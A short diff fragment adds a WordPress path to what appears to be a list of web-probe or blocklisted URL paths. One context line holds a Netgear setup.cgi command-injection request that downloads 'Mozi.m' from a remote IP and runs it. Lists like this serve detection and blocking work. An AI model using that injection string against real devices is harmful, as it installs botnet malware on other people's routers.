@@ -23612,3 +23612,4 @@ http://ipv4.icanhazip.com/
 /elfinder/php/connector.minimal.php
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://124.235.200.172:57063/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 /public/index.php
+/wp-includes/ID3/wp-error_log.php
